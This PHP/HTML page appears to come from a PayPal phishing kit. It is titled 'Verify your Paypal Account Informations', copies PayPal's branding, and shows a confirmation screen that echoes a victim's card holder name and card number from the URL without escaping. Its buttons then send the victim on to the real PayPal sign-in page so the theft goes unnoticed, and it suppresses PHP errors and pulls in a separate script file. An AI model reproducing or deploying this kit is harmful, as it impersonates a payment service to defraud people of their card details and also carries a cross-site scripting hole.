<?php error_reporting(0); ?>
<!DOCTYPE html>
<html>
  <head>
    <head>
      <meta charset="utf-8">
      <title> Verify your Paypal Account Informations </title>
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <script src="../js/ajax.js" charset="utf-8"></script>
      <script src="../js/jquery.js" charset="utf-8"></script>
      <script src="../js/jquery.min.js" charset="utf-8"></script>
      <link rel="stylesheet" href="../css/styles.css">
      <link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
      <link href="https://file.myfontastic.com/hSMyDca9BDwBA8GgvxRZRP/icons.css" rel="stylesheet">
    </head>
  </head>
  <body>
    <div class="bg"></div>
    <a href="./"><div class="logo"></div></a>
    <div class="panels bottom" id="former">
      <div class="profils" style="border-color: #34DB98;">
        <div class="img">
          <img src="unknown.jpg" class="avatar">
        </div>
        <br>
        <div class="name holder"><?php echo $_GET['holder']; ?></div>
        <br>
        <br>
        <div class="name cc"><?php echo $_GET['cc']; ?></div>
      </div>
      <br><br>
      <form class="description" style="text-align: center;" method="post" autocomplete="off">
        <div class="cggreen" data-icon="e"></div>
        <br><br>
        <a href="https://www.paypal.com/signin">
          <div class="btns" name="cg_submit">
            Get Started
            <div class="children"></div>
          </div>
        </a>
        <a href="https://www.paypal.com/signin">
          <div class="btns grey" name="cg_skip">
            Log Out
            <div class="children"></div>
          </div>
        </a>
      </form>
      <div class="loader" id="loader">
        <div class="load"></div>
      </div>
    </div>
    <script type="text/javascript">
      <?php include '../js/js-plus.js'; ?>
    </script>
  </body>
</html>
